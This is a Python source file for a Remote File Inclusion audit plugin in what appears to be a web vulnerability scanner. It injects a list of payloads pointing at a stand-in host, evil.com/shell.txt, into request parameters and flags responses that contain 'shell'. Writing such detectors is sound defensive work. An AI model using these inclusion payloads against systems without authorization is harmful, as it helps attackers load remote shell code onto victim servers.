"""Remote File Inclusion (RFI) audit plugin."""

from __future__ import annotations

import asyncio
from typing import Any

import structlog

from xfweb.core.plugins.plugin_base import AuditPlugin
from xfweb.core.net.http_engine import HttpEngine

logger = structlog.get_logger()

RFI_PAYLOADS = [
    "http://evil.com/shell.txt",
    "http://evil.com/shell.txt?",
    "http://evil.com/shell.txt%00",
    "https://evil.com/shell.txt",
    "ftp://evil.com/shell.txt",
]


class RfiPlugin(AuditPlugin):
    """Remote File Inclusion vulnerability detector."""

    plugin_name = "rfi"
    brief_description = "Detect remote file inclusion (RFI) vulnerabilities"

    async def audit(self, freq: Any, http: HttpEngine) -> None:
        params = self._extract_params(freq)
        if not params:
            return

        tasks = []
        for param_name, param_value in params.items():
            tasks.append(self._test_param(freq, param_name, param_value, http))
        await asyncio.gather(*tasks, return_exceptions=True)

    def _extract_params(self, freq: Any) -> dict[str, str]:
        params: dict[str, str] = {}
        if freq.post_data and isinstance(freq.post_data, str):
            for pair in freq.post_data.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        if freq.url.query:
            for pair in freq.url.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    params[k] = v
        return params

    async def _test_param(self, freq: Any, param: str, value: str, http: HttpEngine) -> None:
        for payload in RFI_PAYLOADS:
            modified_url = freq.url.raw_url.replace(
                f"{param}={value}",
                f"{param}={payload}",
            )
            resp = await http.get(modified_url)

            if resp.status_code == 200 and "shell" in resp.text.lower():
                logger.warning(
                    "xfweb.rfi.vuln_found",
                    url=freq.url.raw_url,
                    param=param,
                    payload=payload,
                )
                return
